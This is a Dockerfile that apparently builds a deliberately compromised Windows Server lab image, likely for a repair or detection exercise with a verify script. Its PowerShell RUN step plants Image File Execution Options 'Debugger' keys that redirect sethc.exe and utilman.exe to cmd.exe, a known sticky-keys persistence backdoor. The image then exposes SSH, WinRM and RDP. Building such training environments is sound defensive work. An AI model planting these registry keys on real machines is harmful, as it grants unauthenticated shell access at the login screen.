# syntax=docker/dockerfile:1
# meta3-win-17-stickykeys-backdoor — IFEO debugger hijack on sethc.exe + utilman.exe (T1546.008)
#
# Server Core lacks accessibility executables (sethc.exe, utilman.exe), so the classic
# "copy cmd.exe over sethc.exe" technique doesn't apply. Instead we plant Image File
# Execution Options (IFEO) Debugger keys — if sethc.exe or utilman.exe ever runs (e.g.
# on Desktop Experience or RDP), the OS redirects to cmd.exe. The same registry trick
# works on full Windows installs and is a well-known persistence mechanism.
FROM sysrepair/meta3-win-base:ltsc2019

SHELL ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "$ErrorActionPreference='Stop';"]

# Plant IFEO debugger hijacks for sethc.exe and utilman.exe → cmd.exe
RUN New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe' -Force | Out-Null ; \
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe' -Name 'Debugger' -Value 'C:\Windows\System32\cmd.exe' ; \
    New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe' -Force | Out-Null ; \
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe' -Name 'Debugger' -Value 'C:\Windows\System32\cmd.exe'

COPY verify.ps1 C:/verify/verify.ps1

EXPOSE 22 5985 3389
CMD ["powershell", "-NoProfile", "-Command", "Start-Service sshd; Start-Service WinRM; Start-Service TermService; while ($true) { Start-Sleep 60 }"]
